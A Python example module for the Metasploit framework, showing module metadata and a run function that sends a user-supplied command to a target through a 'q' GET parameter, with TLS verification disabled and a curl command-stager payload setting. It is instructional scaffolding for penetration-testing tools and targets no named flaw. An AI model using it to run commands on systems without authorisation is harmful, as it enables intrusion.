import logging
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True
from metasploit import module
metadata = {
    'name': 'Python Module Example',
    'description': '''
        Python communication with msfconsole.
    ''',
    'authors': [
        'Jacob Robles'
    ],
    'date': '2018-03-22',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://www.rapid7.com/blog/post/2017/12/28/regifting-python-in-metasploit/'},
        {'type': 'aka', 'ref': 'Coldstone'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
      {'platform':'linux', 'arch': 'x86'}
    ],
    'payload': {
        'command_stager_flavor': 'curl',
    },
    'options': {
        'targeturi': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'command': {'type': 'string', 'description': 'The command to execute via the q GET parameter', 'required': True}
    }
}
def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return
    try:
        r = requests.get('https://{}/{}/?q={}'.format(args['rhost'], args['targeturi'], args['command']), verify=False)
    except requests.exceptions.RequestException as e:
        logging.error('{}'.format(e))
        return
    logging.info('{}...'.format(r.text[0:50]))
if __name__ == '__main__':
    module.run(metadata, run)